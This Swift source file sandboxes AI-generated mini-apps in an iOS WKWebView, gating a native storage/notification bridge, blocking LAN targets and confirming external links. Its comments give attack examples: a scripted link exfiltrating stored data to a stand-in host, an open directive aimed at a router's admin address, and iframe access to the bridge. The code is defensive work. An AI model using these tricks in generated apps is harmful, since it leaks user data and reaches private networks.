import SwiftUI
import WebKit
import UIKit

/// Runs one mini-app in a sandboxed WKWebView. Capability controls CSP and
/// whether top-level navigation / frames are allowed.
///
/// Security model: the native `bridge` (storage/notify/openExternal) is
/// served ONLY while the web view is showing our trusted, CSP-hardened initial
/// document. The moment the page navigates to remote or `data:` content (browser
/// tier), the bridge is disabled so a remote/injected page cannot reach native
/// capabilities by posting to `webkit.messageHandlers.bridge` directly.
struct MiniAppRunnerView: UIViewRepresentable {
    let appId: String
    let html: String
    var capability: MiniAppCapability = .offline

    /// A browser app that only exists to open a site loads that site as its
    /// document. Rendering the shell first cannot work: it has a null origin and
    /// a `default-src 'none'` CSP, so its script is not permitted to navigate
    /// away — which is why sites like x.com never appeared.
    private func load(into webView: WKWebView) {
        // The target comes out of model-authored HTML, so it is validated like
        // any other model-chosen URL: http(s) only, never a private/LAN address.
        if capability == .browser, let target = WebAppBuilder.openTarget(in: html) {
            guard NetworkTargetValidator.isAllowed(target, allowPrivate: false) else {
                // Refused. Do NOT fall through to the generated shell: it
                // contains `location.replace(<target>)` for this exact URL, so
                // rendering it would perform the navigation just refused.
                webView.loadHTMLString(Sandbox.harden(Self.refusedHTML(target), capability: .offline), baseURL: nil)
                return
            }
            // The document is now a REMOTE page, so it must never be treated as
            // our trusted shell: the native bridge stays off. `beginTrustedLoad`
            // turned it on for the shell case — undo that here rather than let
            // x.com inherit storage/notify/openExternal.
            webView.load(URLRequest(url: target))
            return
        }
        webView.loadHTMLString(Sandbox.harden(html, capability: capability), baseURL: nil)
    }

    /// Shown instead of the generated shell when its target is not permitted.
    static func refusedHTML(_ target: URL) -> String {
        let host = (target.host ?? target.absoluteString)
            .replacingOccurrences(of: "<", with: "&lt;")
        return """
        <p style="font:15px/1.5 -apple-system,sans-serif;color:#888;padding:24px">
        Diese Mini-App wollte <b>\(host)</b> öffnen. Das ist eine Adresse im
        lokalen Netzwerk und wird nicht geladen.
        </p>
        """
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(appId: appId, capability: capability)
    }

    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.userContentController.add(context.coordinator, name: "bridge")
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        // A browser-tier app keeps a persistent, per-app session so the user
        // stays logged in to the site it opens; other tiers stay ephemeral.
        // Based on ALREADY-GRANTED consent (readable synchronously) rather than
        // the live `capability`, which is still .offline while the consent alert
        // is up — using that made browser sessions never persist at all. A
        // never-approved app still gets no persistent store.
        if MiniAppConsent.granted(appId: appId) == .browser {
            configuration.websiteDataStore = WKWebsiteDataStore(forIdentifier: Self.sessionStoreID(for: appId))
        } else {
            configuration.websiteDataStore = .nonPersistent()
        }
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.isOpaque = false
        webView.scrollView.contentInsetAdjustmentBehavior = .never
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        context.coordinator.webView = webView
        context.coordinator.capability = capability
        context.coordinator.beginTrustedLoad()
        load(into: webView)
        if capability == .browser,
           let target = WebAppBuilder.openTarget(in: html),
           NetworkTargetValidator.isAllowed(target, allowPrivate: false) {
            context.coordinator.disableBridgeForRemoteDocument()
        }
        return webView
    }

    func updateUIView(_ webView: WKWebView, context: Context) {
        let capabilityChanged = context.coordinator.capability != capability
        context.coordinator.capability = capability
        if context.coordinator.loadedHTML != html || capabilityChanged {
            context.coordinator.loadedHTML = html
            context.coordinator.beginTrustedLoad()
            load(into: webView)
            if capability == .browser,
               let target = WebAppBuilder.openTarget(in: html),
               NetworkTargetValidator.isAllowed(target, allowPrivate: false) {
                context.coordinator.disableBridgeForRemoteDocument()
            }
        }
    }

    static func dismantleUIView(_ webView: WKWebView, coordinator: Coordinator) {
        webView.configuration.userContentController.removeScriptMessageHandler(forName: "bridge")
    }

    /// Stable per-app data-store id for persistent browser sessions (iOS 17+).
    /// Per-app cookie jar. Saved apps have UUID ids and keep theirs; a preview
    /// app is keyed by a content hash, which used to fall back to ONE shared
    /// constant — so every previewed browser app saw each other's sessions.
    /// Deriving keeps them isolated while still stable across opens.
    static func sessionStoreID(for appId: String) -> UUID {
        StableIdentifier.uuid(fromPossibleUUID: appId)
    }

    /// Drop a mini-app's persistent cookie jar when the app itself is deleted.
    /// Otherwise its logins outlive it on disk, owned by nothing.
    static func removeSessionStore(for appId: String) {
        WKWebsiteDataStore.remove(forIdentifier: sessionStoreID(for: appId)) { _ in }
    }

    final class Coordinator: NSObject, WKScriptMessageHandler, WKNavigationDelegate, WKUIDelegate {
        let appId: String
        var capability: MiniAppCapability
        weak var webView: WKWebView?
        var loadedHTML: String?

        /// The bridge only serves the trusted, CSP-hardened initial document.
        private var bridgeActive = true
        /// True for exactly one navigation: our own `loadHTMLString`.
        private var pendingTrustedLoad = false

        init(appId: String, capability: MiniAppCapability) {
            self.appId = appId
            self.capability = capability
        }

        /// Mark the next navigation as a trusted (app-initiated) document load.
        func beginTrustedLoad() {
            pendingTrustedLoad = true
            bridgeActive = true
        }

        /// App-initiated, but the document is a third-party site — allow the
        /// load without granting it the native bridge.
        func disableBridgeForRemoteDocument() {
            bridgeActive = false
        }

        private var storageKeyPrefix: String { "miniapp-storage-\(appId)-" }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction,
                     decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            // Our own hardened (re)load — the only navigation that keeps the bridge.
            if pendingTrustedLoad {
                pendingTrustedLoad = false
                decisionHandler(.allow)
                return
            }
            let url = navigationAction.request.url
            let scheme = url?.scheme?.lowercased()

            // Same-document / in-memory (fragment links, about:) — harmless, keep bridge.
            if scheme == nil || scheme == "about" {
                decisionHandler(.allow)
                return
            }

            let isRemote = scheme == "http" || scheme == "https"
            let isMainFrame = navigationAction.targetFrame?.isMainFrame ?? true

            // Browser tier may load remote content, but only to a target that
            // passes the same validator `load()` applies to the initial URL.
            //
            // It used to allow the tier unconditionally, which made the
            // up-front check decorative: when load() REFUSED a private target
            // it fell through to rendering WebAppBuilder's shell, and that
            // shell contains `location.replace(url)` for the very URL just
            // refused. So `<!-- capability: browser --><!-- open:
            // http://192.168.178.1/ -->` loaded the router admin page inside
            // the mini-app — cleartext is allowed app-wide, and the Local
            // Network permission was already granted for the user's own
            // gateway. Same for 127.0.0.1:11434 and for any later hop.
            if capability.allowsTopLevelNavigation, isRemote {
                guard let url, NetworkTargetValidator.isAllowed(url, allowPrivate: false) else {
                    decisionHandler(.cancel)
                    return
                }
                if isMainFrame { bridgeActive = false }
                decisionHandler(.allow)
                return
            }

            // Everything else — offline/network remote nav, any `data:` top-level
            // load, other schemes — never navigates the sandbox. A user-tapped
            // link opens in Safari instead; scripts cannot navigate away.
            // A link opens Safari only after the SAME confirmation the
            // `open.external` bridge action requires.
            //
            // Before, this path opened Safari directly. WebKit reports a
            // scripted `a.click()` as `.linkActivated`, so an offline mini-app
            // — CSP `default-src 'none'`, never prompted about anything —
            // could read its own stored data, build
            // `https://collect.example/?d=<data>` and launch it with no user
            // action at all: exactly the silent exfiltration the bridge's own
            // confirmation exists to prevent, reached by going around it.
            //
            // WebKit exposes no public way to tell a real tap from a scripted
            // click (`_hasUserGesture` is private and not shippable), so the
            // guarantee here is narrower than "only real taps": a scripted
            // click still reaches the prompt. It cannot leave silently, which
            // is the property that mattered.
            if isMainFrame, isRemote, navigationAction.navigationType == .linkActivated, let url {
                confirmOpenExternal(url)
            }
            decisionHandler(.cancel)
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration,
                     for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            guard let url = navigationAction.request.url,
                  let scheme = url.scheme?.lowercased(), scheme == "http" || scheme == "https" else {
                return nil
            }
            if capability.allowsTopLevelNavigation {
                // Same validator as the main policy handler — a window.open to
                // a LAN address must not slip past it.
                guard NetworkTargetValidator.isAllowed(url, allowPrivate: false) else { return nil }
                bridgeActive = false
                webView.load(URLRequest(url: url))
            } else if navigationAction.navigationType == .linkActivated {
                // Same rule for `target="_blank"`: confirm before leaving.
                confirmOpenExternal(url)
            }
            return nil
        }

        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            // Remote/untrusted page (browser tier navigated away): no native bridge.
            //
            // `isMainFrame` is load-bearing, not defensive noise: a browser-tier
            // app keeps bridgeActive while OUR document is the main frame, but it
            // may embed <iframe src="https://…">. Without this check any
            // cross-origin frame could post to the bridge and reach storage,
            // notifications and openExternal — a full sandbox escape via an
            // ordinary embed.
            guard bridgeActive,
                  message.frameInfo.isMainFrame,
                  message.name == "bridge",
                  let body = message.body as? [String: Any],
                  let callId = body["id"] as? Int,
                  let action = body["action"] as? String else { return }
            let payload = body["payload"] as? [String: Any] ?? [:]

            Task { @MainActor [weak self] in
                guard let self else { return }
                let result = await self.handle(action: action, payload: payload)
                let resultJSON: String
                if let data = try? JSONSerialization.data(withJSONObject: result, options: [.fragmentsAllowed]) {
                    resultJSON = String(decoding: data, as: UTF8.self)
                } else {
                    resultJSON = "null"
                }
                self.webView?.evaluateJavaScript("window.miniapp._resolve(\(callId), \(resultJSON));", completionHandler: nil)
            }
        }

        @MainActor
        private func handle(action: String, payload: [String: Any]) async -> Any {
            switch action {
            case "storage.get":
                if let key = payload["key"] as? String,
                   let stored = UserDefaults.standard.string(forKey: storageKeyPrefix + key),
                   let parsed = try? JSONSerialization.jsonObject(with: Data(stored.utf8), options: [.fragmentsAllowed]) {
                    return parsed
                }
                return NSNull()
            case "storage.set":
                if let key = payload["key"] as? String {
                    let value = payload["value"] ?? NSNull()
                    if let data = try? JSONSerialization.data(withJSONObject: value, options: [.fragmentsAllowed]) {
                        UserDefaults.standard.set(String(decoding: data, as: UTF8.self), forKey: storageKeyPrefix + key)
                        return true
                    }
                }
                return NSNull()
            case "haptic":
                UIImpactFeedbackGenerator(style: .light).impactOccurred()
                return true
            case "notify.schedule":
                return await MiniAppNotificationService.schedule(
                    title: payload["title"] as? String ?? "",
                    body: payload["body"] as? String ?? "",
                    inSeconds: (payload["inSeconds"] as? NSNumber)?.doubleValue ?? 1
                )
            case "open.external":
                // Opening Safari is a user-visible action — always confirm so a
                // generated/injected app can't silently exfiltrate via the URL.
                guard let urlString = payload["url"] as? String,
                      let url = URL(string: urlString),
                      let scheme = url.scheme?.lowercased(),
                      scheme == "http" || scheme == "https" else {
                    return ["ok": false, "error": "invalid_url"]
                }
                let confirmed = await confirmOpenExternal(url)
                if confirmed { UIApplication.shared.open(url, options: [:], completionHandler: nil) }
                return ["ok": confirmed]
            default:
                return NSNull()
            }
        }

        /// Confirm, then open. For the navigation-policy call sites, which are
        /// synchronous and must not leave the app on their own — every route to
        /// Safari goes through the same prompt as the bridge action.
        @MainActor
        func confirmOpenExternal(_ url: URL) {
            Task { @MainActor in
                if await confirmOpenExternal(url) {
                    UIApplication.shared.open(url, options: [:], completionHandler: nil)
                }
            }
        }

        /// Native confirmation before leaving the app for Safari.
        @MainActor
        private func confirmOpenExternal(_ url: URL) async -> Bool {
            guard let presenter = webView?.window?.rootViewController?.topmostPresented else { return false }
            let host = url.host ?? url.absoluteString
            return await withCheckedContinuation { continuation in
                var resumed = false
                func finish(_ value: Bool) { if !resumed { resumed = true; continuation.resume(returning: value) } }
                let alert = UIAlertController(
                    title: String(localized: "Im Browser öffnen?"),
                    message: host,
                    preferredStyle: .alert
                )
                alert.addAction(UIAlertAction(title: String(localized: "Abbrechen"), style: .cancel) { _ in finish(false) })
                alert.addAction(UIAlertAction(title: String(localized: "Öffnen"), style: .default) { _ in finish(true) })
                presenter.present(alert, animated: true)
            }
        }
    }
}

private extension UIViewController {
    var topmostPresented: UIViewController {
        var vc: UIViewController = self
        while let presented = vc.presentedViewController { vc = presented }
        return vc
    }
}
